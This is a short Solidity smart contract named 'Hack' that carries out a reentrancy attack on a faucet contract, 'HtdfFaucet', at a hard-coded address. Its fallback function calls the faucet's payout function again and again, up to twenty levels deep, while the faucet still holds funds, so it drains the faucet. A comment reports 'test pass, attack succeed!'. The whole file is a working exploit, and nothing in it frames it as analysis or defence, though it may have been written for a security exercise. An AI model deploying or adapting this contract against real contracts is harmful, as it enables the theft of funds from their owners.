// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.0 <0.9.0;

import "./htd.sol";

contract Hack {

    HtdfFaucet public faucet;
    uint256 public stackDepth = 0;
    address public addr;
    address public owner;
    uint8 MAX_DEPTH = 20;

    constructor() payable{
    	// 此处也可以由构造函数参数传入
        addr = address(0x6E5d67626832926d9001109C1c13BAA82bf9277c);
        faucet = HtdfFaucet(addr);
        owner = msg.sender;
    }

    // test pass, attack succeed!
    function  doHack() public {
        stackDepth = 0;
        faucet.getOneHtdf();
    }

    // fallback function
    fallback() external payable {
        stackDepth += 1;
        if(msg.sender.balance >= 100000000 && stackDepth <= MAX_DEPTH) {
            faucet.getOneHtdf();
        }
    }

}